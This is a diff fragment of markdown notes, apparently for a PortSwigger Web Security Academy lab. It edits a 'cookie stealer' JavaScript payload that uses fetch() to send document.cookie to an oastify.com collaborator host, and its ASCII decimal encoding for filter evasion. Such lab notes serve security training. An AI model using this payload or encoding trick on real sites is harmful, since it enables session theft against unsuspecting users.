@@ -199,15 +199,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >Collaborator payload ***cookie stealer***:  
 
 ```
-x=fetch(`https://gp9o1893jak1dze7utv2rkvr0i69uzio.oastify.com/?z=`+document.cookie)
+x=fetch('https://gp9o1893jak1dze7utv2rkvr0i69uzio.oastify.com/?z='+document.cookie)
 ```
 
->The ASCII decimal values for each character in the above payload string, separated by commas:
+>The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.  
 
 ```
-100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101
-
-Each number represents the ASCII decimal value of the corresponding character in the string.
+120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
 ```  
 
 >Python script to convert any payload to ASCIII decimal values:  
